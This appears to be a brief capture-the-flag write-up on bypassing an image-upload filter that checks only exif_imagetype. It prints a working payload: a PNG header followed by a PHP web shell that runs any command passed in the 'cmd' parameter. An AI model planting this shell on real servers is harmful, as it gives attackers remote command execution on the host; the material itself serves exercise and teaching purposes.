There is just clientside check for what you are putting in and a server side check of exif_imagetype which can easily be bypassed so just framing a png as such you would get the required flag


```
�PNG

<?php echo system($_GET['cmd']); ?>

```